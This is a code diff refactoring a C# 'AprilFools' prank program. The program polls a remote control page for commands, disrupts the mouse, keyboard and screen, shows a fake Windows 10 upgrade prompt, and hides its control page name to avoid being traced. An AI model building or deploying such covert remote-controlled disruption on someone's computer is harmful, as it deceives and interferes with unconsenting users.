@@ -50,21 +50,49 @@ namespace AprilFools
         private const int _externalControlThreadPollingInterval = 5 * 1000;
         private const int _externalControlThreadPauseAfterFail = 5 * 60 * 1000 - _externalControlThreadPollingInterval;//5 min wait after each failure
 
+        private const int TollerableExceptionCount = 3;
+        private static int exceptionCount = 0;
+
+        //Threads
         private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
         private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
         private static bool _popupThreadRunning = true;//should always run unless all popups are disabled
         private static bool _eraticMouseRunning = false;
         private static bool _wanderMouseRunning = false;
         private static bool _eraticKeyboardThreadRunning = false;
+        private static Thread externalControlThread;
+        private static Thread mouseThread;
+        private static Thread eraticKeyboardThread;
+        private static Thread soundThread;
+        private static Thread popupThread;
 
-        private const int TollerableExceptionCount = 3;
-        private static int exceptionCount = 0;
+        //Control Page info
+        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
+        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
+        private const string NEW_CMD_TAG = "_NEW_";
+        private const char CMD_SEPERATION_TAG = '\n';
+        private const int externalControlPageMaxFailAttempts = 100;
+        private static int externalControlPageFailAttempts = 0;
+        private static int externalControlScheduleDisplayLimit = 15;
+        private static int externalControLogDisplayLimit = 15;
+        private static string ctrlWebPage = null;
 
-        private static CursorWanderAI cursorWanderID = new CursorWanderAI();
+        //Session and schedule info
+        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 5 min.</summary>
+        private const int sessionDefaultStartDelay = 5 * 60 * 1000;
+        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
+        private const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
+        private static EventScheduler<PrankerEvent> schedule;
+        private const PrankerSchedule defaultScheduleType = PrankerSchedule.Easy;
 
+        //Sounds
         private static bool _playBombBeepingNow = false;
         private static PrankerSound nextSound = PrankerSound.None;
+
+        //Popups
         private static PrankerPopup nextPopup = PrankerPopup.None;
+        private static ScreenCoverForm screenCoverForm = new ScreenCoverForm();
+        private static Windows10UpgradeForm win10Prompt = new Windows10UpgradeForm();
 
         //Key mapping using assosiative arrays / dictionary
         public static List<Keys> keysToTrack = null;
@@ -75,30 +103,7 @@ namespace AprilFools
         public static bool keyMappingsActive = false;
         public static int KeyMappingMaxDurration = 30 * 60 * 1000;//30 minutes
 
-        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 5 min.</summary>
-        const int sessionDefaultStartDelay = 5 * 60 * 1000;
-        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
-        const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
-        private static EventScheduler<PrankerEvent> schedule;
-        private const PrankerSchedule defaultScheduleType = PrankerSchedule.Easy;
-
-        private static Thread externalControlThread;
-        private static Thread mouseThread;
-        private static Thread eraticKeyboardThread;
-        private static Thread soundThread;
-        private static Thread popupThread;
-
-        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
-        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
-        private const string NEW_CMD_TAG = "_NEW_";
-        private const char CMD_SEPERATION_TAG = '\n';
-        private const int externalControlPageFailMaxAttempts = 100;
-        private static int externalControlPageFailAttempts = 0;
-        private static int externalControlScheduleDisplayLimit = 15;
-        private static int externalControLogDisplayLimit = 15;
-        private static string ctrlWebPage = null;
-
-        private static Windows10UpgradeForm win10Prompt = new Windows10UpgradeForm();
+        private static CursorWanderAI cursorWanderID = new CursorWanderAI();
 
         /// <summary>
         /// Entry point for prank application
@@ -124,7 +129,6 @@ namespace AprilFools
         }
 
         #region Test code
-        static ScreenCoverForm screenCoverForm = new ScreenCoverForm();
         public static void TestCode1()
         {
             //schedule.AddEvent(PrankerEvent.RunWanderMouse10s, 0);
@@ -367,7 +371,7 @@ namespace AprilFools
                     externalControlPageFailAttempts = 0; //sucsessfull transactions - read and write
                 else //returned null on second page read (write)
                 {
-                    if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
+                    if (++externalControlPageFailAttempts >= externalControlPageMaxFailAttempts)
                     {
                         _externalControlThreadRunning = false;
                         GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs (" + GenericsClass.GetLogData(externalControLogDisplayLimit).Length + " chars)");
@@ -378,7 +382,7 @@ namespace AprilFools
             }
             else //returned null on first page read
             {
-                if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
+                if (++externalControlPageFailAttempts >= externalControlPageMaxFailAttempts)
                 {
                     _externalControlThreadRunning = false;
                     GenericsClass.Log("ReadFromCtrlWebPage() - External control page read timed out after " + externalControlPageFailAttempts + " attempts.");
